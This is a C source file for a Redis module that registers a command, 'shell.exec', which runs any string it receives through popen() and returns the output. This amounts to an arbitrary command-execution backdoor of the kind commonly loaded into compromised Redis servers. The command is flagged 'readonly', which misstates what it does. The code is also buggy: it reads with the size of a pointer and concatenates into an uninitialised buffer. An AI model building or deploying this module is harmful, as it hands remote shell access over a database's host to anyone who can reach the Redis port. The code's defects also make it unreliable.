#include "redismodule.h"

#include <stdio.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

int Shell(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
                size_t cmd_len;
                size_t size = 1024;
                char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

                FILE *fp = popen(cmd, "r");
                char *buf, *output;
                buf = (char *)malloc(size);
                output = (char *)malloc(size);
                while ( fgets(buf, sizeof(buf), fp) != 0 ) {
                        if (strlen(buf) + strlen(output) >= size) {
                                output = realloc(output, size<<2);
                                size <<= 1;
                        }
                        strcat(output, buf);
                }
                RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
                RedisModule_ReplyWithString(ctx, ret);
                pclose(fp);
        } else {
                return RedisModule_WrongArity(ctx);
        }
        return REDISMODULE_OK;
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx,"shell",1,REDISMODULE_APIVER_1)
                        == REDISMODULE_ERR) return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "shell.exec",
        Shell, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
